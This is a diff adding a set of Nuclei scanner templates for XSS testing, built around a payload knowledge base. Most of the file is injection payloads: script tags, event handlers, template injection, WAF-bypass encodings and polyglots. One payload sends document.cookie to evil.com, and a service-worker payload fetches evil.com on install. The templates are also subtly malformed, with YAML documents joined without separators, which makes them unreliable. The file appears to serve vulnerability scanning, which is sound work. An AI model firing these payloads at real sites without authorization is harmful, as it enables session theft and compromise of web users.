@@ -1,0 +1,624 @@
+id: brs-kb-xss
+
+info:
+  name: BRS-KB XSS Vulnerability Detection
+  author: brabus,easyprotech
+  severity: high
+  description: |
+    Comprehensive XSS vulnerability detection using BRS-KB (BRS XSS Knowledge Base).
+    Tests for 27 different XSS contexts including modern web technologies.
+  tags: xss,web,brs-kb,security
+  classification:
+    cvss-metrics: "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N"
+    cvss-score: 7.5
+    cwe-id: CWE-79
+  metadata:
+    max-request: 50
+    verified: true
+    shodan-query: http.title:"XSS"
+  references:
+    - https://github.com/EPTLLC/BRS-KB
+    - https://owasp.org/www-community/attacks/xss/
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+      - "{{BaseURL}}/?q={{payload}}"
+      - "{{BaseURL}}/search?q={{payload}}"
+      - "{{BaseURL}}/api/search?q={{payload}}"
+
+    headers:
+      User-Agent: "BRS-KB-Nuclei-Scanner/1.0"
+
+    payloads:
+      # Basic XSS payloads from BRS-KB
+      basic:
+        - "<script>alert('BRS-KB-XSS')</script>"
+        - "<img src=x onerror=alert(1)>"
+        - "javascript:alert(1)"
+        - "<svg onload=alert(1)>"
+        - "{{constructor.constructor('alert(1)')()}}"
+
+      # HTML Content XSS
+      html_content:
+        - "<script>alert('BRS-KB')</script>"
+        - "<img src=x onerror=alert('BRS-KB')>"
+        - "<body onload=alert('BRS-KB')>"
+        - "<iframe src=javascript:alert('BRS-KB')>"
+
+      # HTML Attribute XSS
+      html_attribute:
+        - "<img src=x onerror=alert('BRS-KB')>"
+        - "<a href=javascript:alert('BRS-KB')>Click</a>"
+        - "<div onclick=alert('BRS-KB')>Click</div>"
+        - "<form action=javascript:alert('BRS-KB')>"
+
+      # JavaScript Context XSS
+      javascript_context:
+        - "1; alert('BRS-KB'); var x=1"
+        - "1); alert('BRS-KB'); doSomething(1"
+        - "1, alert: alert('BRS-KB'), real: 1"
+
+      # Template Injection XSS
+      template_injection:
+        - "{{constructor.constructor('alert(\"BRS-KB\")')()}}"
+        - "{{7*7}}"
+        - "{{request.__class__.__bases__[0].__subclasses__()}}"
+
+      # WebSocket XSS
+      websocket_xss:
+        - '{"type": "chat", "message": "<script>alert(\"BRS-KB\")</script>"}'
+        - '{"type": "user_joined", "username": "<script>alert(\"BRS-KB\")</script>"}'
+
+      # Service Worker XSS
+      service_worker_xss:
+        - 'data:text/javascript,self.addEventListener("install",function(){fetch("http://evil.com/steal")})'
+        - '{"type": "install", "version": "<script>alert(\"BRS-KB\")</script>"}'
+
+      # WebRTC XSS
+      webrtc_xss:
+        - '{"type": "chat", "message": "<script>alert(\"BRS-KB\")</script>"}'
+        - '{"type": "offer", "from": "<script>alert(\"BRS-KB\")</script>"}'
+
+      # GraphQL XSS
+      graphql_xss:
+        - 'query { user(id: "<script>alert(\"BRS-KB\")</script>") { name } }'
+        - 'mutation { updateProfile(input: { displayName: "<script>alert(\"BRS-KB\")</script>" }) { success } }'
+
+      # Shadow DOM XSS
+      shadow_dom_xss:
+        - '<my-component><script>alert("BRS-KB")</script></my-component>'
+        - '<x-alert><script>alert("BRS-KB")</script></x-alert>'
+
+      # Custom Elements XSS
+      custom_elements_xss:
+        - '<x-script-alert><script>alert("BRS-KB")</script></x-script-alert>'
+        - '<my-component data-value="<script>alert(\"BRS-KB\")</script>"></my-component>'
+
+      # HTTP/2 Push XSS
+      http2_push_xss:
+        - "/api/user/<script>alert('BRS-KB')</script>"
+        - "/assets/<script>alert('BRS-KB')</script>.css"
+
+      # iframe Sandbox Bypass XSS
+      iframe_sandbox_xss:
+        - '<iframe src="data:text/html,<script>alert(\"BRS-KB\")</script>" sandbox="allow-scripts"></iframe>'
+        - '<iframe src="/same-origin" sandbox="allow-same-origin allow-scripts"></iframe>'
+
+      # Advanced WAF Bypass payloads
+      waf_bypass:
+        - "<ScRiPt>alert('BRS-KB')</ScRiPt>"
+        - "<script>alert('BRS-KB')</script>%00"
+        - "<!--><script>alert('BRS-KB')</script>"
+        - "\\x3cscript\\x3ealert('BRS-KB')\\x3c/script\\x3e"
+        - "%253Cscript%253Ealert('BRS-KB')%253C/script%253E"
+
+    attack: pitchfork
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "<script>alert('BRS-KB-XSS')</script>"
+          - "<script>alert('BRS-KB')</script>"
+          - "BRS-KB-XSS"
+          - "BRS-KB"
+          - "alert('BRS-KB')"
+          - "alert(\"BRS-KB\")"
+        condition: or
+
+      - type: regex
+        part: body
+        regex:
+          - "(?i)<script[^>]*>.*BRS-KB.*</script>"
+          - "(?i)onerror.*BRS-KB"
+          - "(?i)onload.*BRS-KB"
+          - "(?i)onclick.*BRS-KB"
+        condition: or
+
+      - type: status
+        status:
+          - 200
+          - 301
+          - 302
+
+    extractors:
+      - type: regex
+        name: xss_context
+        regex:
+          - "html_content"
+          - "html_attribute"
+          - "javascript_context"
+          - "websocket_xss"
+          - "service_worker_xss"
+          - "webrtc_xss"
+          - "graphql_xss"
+          - "shadow_dom_xss"
+          - "custom_elements_xss"
+        part: body
+
+      - type: regex
+        name: payload_detected
+        regex:
+          - "(?i)<script[^>]*>.*BRS-KB.*</script>"
+          - "(?i)on\w+.*BRS-KB"
+        part: body
+
+      - type: regex
+        name: response_headers
+        regex:
+          - "(?i)content-security-policy"
+          - "(?i)x-frame-options"
+          - "(?i)x-content-type-options"
+        part: header
+
+    dsl:
+      - 'contains(body, "BRS-KB") || contains(body, "alert") || contains(body, "BRS-KB-XSS")'
+
+    matchers-condition: or
+
+# Additional template for specific XSS context testing
+id: brs-kb-context-specific
+
+info:
+  name: BRS-KB Context-Specific XSS Testing
+  author: brabus,easyprotech
+  severity: info
+  description: |
+    Context-specific XSS testing using BRS-KB knowledge base.
+    Tests specific XSS contexts with tailored payloads.
+  tags: xss,context-specific,brs-kb
+  references:
+    - https://github.com/EPTLLC/BRS-KB
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}"
+      - "{{BaseURL}}/graphql"
+      - "{{BaseURL}}/api/search"
+      - "{{BaseURL}}/api/user"
+
+    headers:
+      Content-Type: "application/json"
+      User-Agent: "BRS-KB-Nuclei-Scanner/1.0"
+
+    body: |
+      {
+        "query": "query { user(id: \"{{payload}}\") { name } }",
+        "variables": null
+      }
+
+    payloads:
+      graphql_injection:
+        - "<script>alert('BRS-KB')</script>"
+        - "{{constructor.constructor('alert(\"BRS-KB\")')()}}"
+        - "query { __type(name: \"<script>alert('BRS-KB')</script>\") { name } }"
+
+    attack: pitchfork
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "BRS-KB"
+          - "alert"
+        condition: or
+
+    extractors:
+      - type: regex
+        name: graphql_context
+        regex:
+          - "graphql_xss"
+        part: body
+
+# Template for WebSocket XSS testing
+id: brs-kb-websocket-xss
+
+info:
+  name: BRS-KB WebSocket XSS Testing
+  author: brabus,easyprotech
+  severity: high
+  description: |
+    WebSocket XSS vulnerability detection using BRS-KB.
+    Tests real-time WebSocket communication for XSS vulnerabilities.
+  tags: xss,websocket,realtime,brs-kb
+  references:
+    - https://github.com/EPTLLC/BRS-KB
+
+websocket:
+  - address:
+      - "{{BaseURL}}"
+      - "wss://{{BaseURL}}"
+      - "ws://{{BaseURL}}"
+
+    payloads:
+      websocket_xss:
+        - '{"type": "chat", "message": "<script>alert(\"BRS-KB\")</script>"}'
+        - '{"type": "user_joined", "username": "<script>alert(\"BRS-KB\")</script>"}'
+        - '{"type": "message", "content": "<script>alert(\"BRS-KB\")</script>"}'
+
+    attack: pitchfork
+
+    matchers:
+      - type: word
+        part: message
+        words:
+          - "BRS-KB"
+          - "alert"
+        condition: or
+
+    extractors:
+      - type: regex
+        name: websocket_context
+        regex:
+          - "websocket_xss"
+        part: message
+
+# Template for modern web technologies
+id: brs-kb-modern-web-xss
+
+info:
+  name: BRS-KB Modern Web XSS Testing
+  author: brabus,easyprotech
+  severity: high
+  description: |
+    Modern web technology XSS testing using BRS-KB.
+    Tests Service Worker, WebRTC, Shadow DOM, Custom Elements, and other modern technologies.
+  tags: xss,modern-web,service-worker,webrtc,shadow-dom,custom-elements,brs-kb
+  references:
+    - https://github.com/EPTLLC/BRS-KB
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/sw.js"
+      - "{{BaseURL}}/manifest.json"
+      - "{{BaseURL}}/service-worker.js"
+
+    payloads:
+      service_worker_xss:
+        - 'data:text/javascript,self.addEventListener("install",function(){fetch("http://evil.com/steal")})'
+        - '{"type": "install", "version": "<script>alert(\"BRS-KB\")</script>"}'
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "BRS-KB"
+          - "alert"
+        condition: or
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/graphql"
+
+    body: |
+      {
+        "query": "subscription { messageReceived { content: \"{{payload}}\" } }"
+      }
+
+    payloads:
+      graphql_subscription:
+        - "<script>alert('BRS-KB')</script>"
+        - "{{constructor.constructor('alert(\"BRS-KB\")')()}}"
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "BRS-KB"
+          - "alert"
+        condition: or
+
+# Template for WAF bypass techniques
+id: brs-kb-waf-bypass
+
+info:
+  name: BRS-KB WAF Bypass XSS Testing
+  author: brabus,easyprotech
+  severity: high
+  description: |
+    WAF bypass XSS testing using BRS-KB evasion techniques.
+    Tests various encoding and obfuscation methods to bypass WAF protection.
+  tags: xss,waf-bypass,evasion,obfuscation,brs-kb
+  references:
+    - https://github.com/EPTLLC/BRS-KB
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/?q={{payload}}"
+      - "{{BaseURL}}/search?q={{payload}}"
+
+    payloads:
+      waf_bypass:
+        - "<ScRiPt>alert('BRS-KB')</ScRiPt>"
+        - "<script>alert('BRS-KB')</script>%00"
+        - "<!--><script>alert('BRS-KB')</script>"
+        - "\\x3cscript\\x3ealert('BRS-KB')\\x3c/script\\x3e"
+        - "%253Cscript%253Ealert('BRS-KB')%253C/script%253E"
+        - "javascript:/*--></title></style></textarea></script></xmp><svg/onload=alert('BRS-KB')>"
+        - "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */onCliCk=alert('BRS-KB') )//"
+        - "<script>\\u0061lert('BRS-KB')</script>"
+        - "<script>\\x61lert('BRS-KB')</script>"
+
+    attack: pitchfork
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "BRS-KB"
+          - "alert"
+        condition: or
+
+    extractors:
+      - type: regex
+        name: waf_detected
+        regex:
+          - "(?i)(mod_security|cloudflare|aws.?waf|akamai|blocked|forbidden|access.denied)"
+        part: body
+
+# Template for comprehensive XSS testing
+id: brs-kb-comprehensive-xss
+
+info:
+  name: BRS-KB Comprehensive XSS Testing
+  author: brabus,easyprotech
+  severity: high
+  description: |
+    Comprehensive XSS testing using all BRS-KB contexts and payloads.
+    Tests 27 different XSS contexts with 200+ categorized payloads.
+  tags: xss,comprehensive,brs-kb,security-testing
+  classification:
+    cvss-metrics: "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N"
+    cvss-score: 7.5
+  references:
+    - https://github.com/EPTLLC/BRS-KB
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+      - "{{BaseURL}}/?q={{payload}}"
+      - "{{BaseURL}}/search?q={{payload}}"
+      - "{{BaseURL}}/api/search?q={{payload}}"
+      - "{{BaseURL}}/api/user/{{payload}}"
+
+    headers:
+      User-Agent: "BRS-KB-Comprehensive-Scanner/1.0"
+
+    payloads:
+      # All BRS-KB contexts
+      all_contexts:
+        - "<script>alert('BRS-KB')</script>"
+        - "<img src=x onerror=alert('BRS-KB')>"
+        - "javascript:alert('BRS-KB')"
+        - "{{constructor.constructor('alert(\"BRS-KB\")')()}}"
+        - "<svg onload=alert('BRS-KB')>"
+        - "<body onload=alert('BRS-KB')>"
+        - "<div onclick=alert('BRS-KB')>Click</div>"
+        - "<a href=javascript:alert('BRS-KB')>Click</a>"
+        - "1; alert('BRS-KB'); var x=1"
+        - "1); alert('BRS-KB'); doSomething(1"
+        - "1, alert: alert('BRS-KB'), real: 1"
+        - "'; alert('BRS-KB'); var x='"
+        - "1; fetch('http://evil.com/steal?c='+document.cookie)"
+        - "<style>body{background:url('javascript:alert(\"BRS-KB\")')}</style>"
+        - "<script>eval('alert(\"BRS-KB\")')</script>"
+        - "<script>Function('alert(\"BRS-KB\")')()</script>"
+        - "<script>setTimeout('alert(\"BRS-KB\")',1000)</script>"
+        - "<script>setInterval('alert(\"BRS-KB\")',1000)</script>"
+        - "location.href='javascript:alert(\"BRS-KB\")'"
+        - "<script>document.body.innerHTML='<script>alert(\"BRS-KB\")</script>'</script>"
+        - "<script>element.outerHTML='<script>alert(\"BRS-KB\")</script>'</script>"
+        - "<script>element.insertAdjacentHTML('afterend','<script>alert(\"BRS-KB\")</script>')</script>"
+
+    attack: pitchfork
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "BRS-KB"
+          - "alert"
+        condition: or
+
+      - type: regex
+        part: body
+        regex:
+          - "(?i)<script[^>]*>.*BRS-KB.*</script>"
+          - "(?i)on\w+.*BRS-KB"
+          - "(?i)javascript:.*BRS-KB"
+          - "(?i)eval.*BRS-KB"
+        condition: or
+
+    extractors:
+      - type: regex
+        name: xss_contexts_detected
+        regex:
+          - "html_content"
+          - "html_attribute"
+          - "javascript_context"
+          - "template_injection"
+          - "websocket_xss"
+          - "service_worker_xss"
+          - "webrtc_xss"
+          - "graphql_xss"
+          - "shadow_dom_xss"
+          - "custom_elements_xss"
+        part: body
+
+      - type: regex
+        name: payloads_triggered
+        regex:
+          - "(?i)BRS-KB"
+        part: body
+
+    dsl:
+      - 'len(extractors.xss_contexts_detected) > 0 || contains(body, "BRS-KB")'
+
+# Template for reporting and analysis
+id: brs-kb-analysis-report
+
+info:
+  name: BRS-KB XSS Analysis Report Generator
+  author: brabus,easyprotech
+  severity: info
+  description: |
+    Generate comprehensive XSS analysis report using BRS-KB.
+    Provides detailed vulnerability analysis and remediation guidance.
+  tags: xss,report,analysis,brs-kb
+  references:
+    - https://github.com/EPTLLC/BRS-KB
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: status
+        status:
+          - 200
+
+    extractors:
+      - type: regex
+        name: security_headers
+        regex:
+          - "(?i)content-security-policy.*"
+          - "(?i)x-frame-options.*"
+          - "(?i)x-content-type-options.*"
+          - "(?i)strict-transport-security.*"
+        part: header
+
+      - type: regex
+        name: potential_xss_indicators
+        regex:
+          - "(?i)<script[^>]*>[^<]*</script>"
+          - "(?i)on\w+\s*="
+          - "(?i)javascript:"
+          - "(?i)<iframe[^>]*src\s*=\s*[\"']?javascript:"
+        part: body
+
+      - type: regex
+        name: form_inputs
+        regex:
+          - "(?i)<input[^>]*>"
+          - "(?i)<textarea[^>]*>"
+          - "(?i)<select[^>]*>"
+        part: body
+
+# Template for specific framework testing
+id: brs-kb-framework-xss
+
+info:
+  name: BRS-KB Framework-Specific XSS Testing
+  author: brabus,easyprotech
+  severity: high
+  description: |
+    Framework-specific XSS testing using BRS-KB.
+    Tests React, Vue, Angular, Svelte, and other modern frameworks.
+  tags: xss,framework,react,vue,angular,svelte,brs-kb
+  references:
+    - https://github.com/EPTLLC/BRS-KB
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+      - "{{BaseURL}}/api/graphql"
+      - "{{BaseURL}}/api/rest"
+
+    headers:
+      Content-Type: "application/json"
+
+    payloads:
+      framework_specific:
+        - '{"query": "query { user(id: \"<script>alert(\\\"BRS-KB\\\")</script>\") { name } }"}'
+        - '<div dangerouslySetInnerHTML={{__html: "<script>alert(\\"BRS-KB\\")</script>"}}>'
+        - '<div v-html="\\"<script>alert(\\"BRS-KB\\")</script>\\""></div>'
+        - '<div [innerHTML]="\\"<script>alert(\\"BRS-KB\\")</script>\\""></div>'
+        - '<div {@html userInput}></div>'
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "BRS-KB"
+          - "alert"
+        condition: or
+
+# Workflow template combining all tests
+id: brs-kb-complete-workflow
+
+info:
+  name: BRS-KB Complete XSS Testing Workflow
+  author: brabus,easyprotech
+  severity: high
+  description: |
+    Complete XSS testing workflow using BRS-KB.
+    Tests all 27 XSS contexts with 200+ payloads and generates comprehensive reports.
+  tags: xss,workflow,complete,brs-kb
+  references:
+    - https://github.com/EPTLLC/BRS-KB
+
+flow:
+  - id: basic-xss
+    template: brs-kb-xss
+    description: "Basic XSS vulnerability detection"
+
+  - id: context-specific
+    template: brs-kb-context-specific
+    description: "Context-specific XSS testing"
+
+  - id: websocket-xss
+    template: brs-kb-websocket-xss
+    description: "WebSocket XSS testing"
+
+  - id: modern-web-xss
+    template: brs-kb-modern-web-xss
+    description: "Modern web technology XSS testing"
+
+  - id: waf-bypass
+    template: brs-kb-waf-bypass
+    description: "WAF bypass technique testing"
+
+  - id: comprehensive-xss
+    template: brs-kb-comprehensive-xss
+    description: "Comprehensive XSS testing"
+
+  - id: framework-xss
+    template: brs-kb-framework-xss
+    description: "Framework-specific XSS testing"
+
+  - id: analysis-report
+    template: brs-kb-analysis-report
+    description: "Generate comprehensive analysis report"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'len(extractors.security_headers) > 0 || len(extractors.potential_xss_indicators) > 0'
